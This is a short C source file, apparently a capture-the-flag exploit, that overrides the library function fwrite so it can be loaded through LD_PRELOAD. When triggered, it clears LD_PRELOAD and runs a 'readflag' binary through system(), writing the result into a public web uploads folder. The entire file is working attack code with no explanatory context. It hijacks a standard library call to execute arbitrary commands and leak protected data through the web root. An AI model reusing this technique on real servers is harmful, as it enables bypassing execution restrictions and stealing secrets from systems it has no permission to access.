#include <stdio.h>
#include <stdlib.h>

size_t fwrite(const void *ptr, size_t size, size_t nmemb,FILE *stream){
	unsetenv("LD_PRELOAD");
	system("/usr/local/bin/readflag > /var/www/html/uploads/flag.txt");
	return 1;
}